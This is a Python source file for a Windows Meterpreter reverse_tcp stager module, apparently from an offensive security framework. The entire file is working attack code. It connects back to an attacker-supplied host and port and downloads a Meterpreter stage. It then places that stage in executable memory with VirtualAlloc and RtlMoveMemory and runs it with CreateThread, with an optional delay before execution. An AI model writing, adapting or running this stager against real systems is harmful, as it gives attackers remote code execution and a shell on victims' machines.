########################################################
### Meterpreter Module
### Status: untested
########################################################

from utils.helper import nstate as nstate
from utils.windef import *
from utils.winconst import *
#from utils.helper import CheckFile, GetFileHash
from time import sleep
import socket
import struct

CATEGORY = 'stager'

def register_arguments(parser):
    parser.add_argument('-p', '--port', default=4444, type=int, required=True, help='Remote port to connect to')
    parser.add_argument('-r', '--remote-host', type=str, required=True, help='Remote host to connect to')

    grp = parser.add_argument_group('additional')
    grp.add_argument('-a', '--arch', choices=['x64', 'x86'], default='x64', type=str, help= 'Architecture to use, x64 is the default')
    grp.add_argument('-s', '--sleep', default=0, type=int, required=True, help='Sleep for x seconds before the stage is executed')
    grp.add_argument('-t', '--timeout', default=30, type=int, help='Connect timeout in seconds, 30 seconds is the default')

class module:
    
    Author          = 'raptor@0xdeadbeef.info, psycore8'
    Description     = 'Connect back (reverse_tcp) to remote host and receive a stage'
    Version         = '1.2.1'
    DisplayName      = 'METERPRETER-STAGER'
    payload         = any
    payload_size    = int
    sock            = any

    def __init__(self, remote_host=str, remote_port=int, timeout=int, architecture=str, sleeptime=int):
        self.remote_host = remote_host
        self.remote_port = remote_port
        self.timeout = timeout
        self.architecture = architecture
        self.sleeptime = sleeptime

    def msg(self, message_type, ErrorExit=False):
        messages = {
            'pre.head'      : f'{nstate.FormatModuleHeader(self.DisplayName, self.Version)}\n',
            'proc.sock'     : f'{nstate.s_note} Creating Socket...',
            'proc.con'      : f'{nstate.s_ok} Connection established',
            'proc.stage'    : f'{nstate.s_note} Download stage...',
            'proc.size'     : f'{nstate.s_note} Payload size: {self.payload_size} bytes',
            'proc.stage_ok' : f'{nstate.s_ok} Stage downloaded!',
            'proc.exec'     : f'{nstate.s_note} Trying to execute Meterpreter stage...',
            'inj.alloc'     : f'{nstate.s_ok} Memory allocated!',
            'inj.sleep'     : f'{nstate.s_info} Let\'s take a nap for {self.sleeptime} seconds',
            'inj.exec'      : f'{nstate.s_note} Execute payload...',
            'inj.ok'        : f'{nstate.s_ok} Looks good!',
            'inj.fail'      : f'{nstate.s_fail} Payload not executed',
            'post.done'     : f'{nstate.s_ok} DONE!',
            'error.con'     : f'{nstate.s_fail} Connevtion failed',
            'error.stage_ok': f'{nstate.s_fail} Error during download'
        }
        print(messages.get(message_type, f'{message_type} - this message type is unknown'))
        if ErrorExit:
            exit()

    def CreateSocket(self):
        self.msg('proc.sock')
        socket.setdefaulttimeout(self.timeout)
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        con = self.sock.connect_ex((self.remote_host, self.remote_port))
        if con == 0:
            self.msg('proc.con')
        else:
            self.msg('error.con')

    def ReceivePayload(self):
        # get 4-byte payload length
        l = struct.unpack("@I", self.sock.recv(4))[0]

        # download payload
        self.msg('proc.stage')
        d = self.sock.recv(l)
        while len(d) < l:
            d += self.sock.recv(l - len(d))
        self.payload_size = len(d)
        self.msg('proc.size')

        if self.architecture == 'x64':
            self.payload = bytearray(
                b"\x48\xbf"
                + self.sock.fileno().to_bytes(8, byteorder="little")
                + d)
        elif self.architecture == 'x86':
            self.payload = bytearray(
                    b"\xbf"
                    + self.sock.fileno().to_bytes(4, byteorder="little")
                    + d)
        if self.payload:
            self.msg('proc.stage_ok')
        else:
            self.msg('error.stage_ok', True)
            
    def LaunchStage(self):
        self.msg('proc.exec')
        ptr = VirtualAlloc(0, len(self.payload), MEM_COMMIT_RESERVE, PAGE_READWRITE_EXECUTE)
        if ptr:
            self.msg('inj.alloc')
            RtlMoveMemory(ptr, bytes(self.payload), len(self.payload))

        if self.sleeptime > 0:
            self.msg('inj.sleep')
            sleep(self.sleeptime)
        
        self.msg('inj.exec')
        ht = CreateThread(None, 0, ptr, None, 0, None)
        if ht:
            self.msg('inj.ok')
        else:
            self.msg('inj.fail', True)
        WaitForSingleObject(ht, -1)    

    def process(self):
        self.msg('pre.head')
        self.CreateSocket()
        self.ReceivePayload()
        self.LaunchStage()

    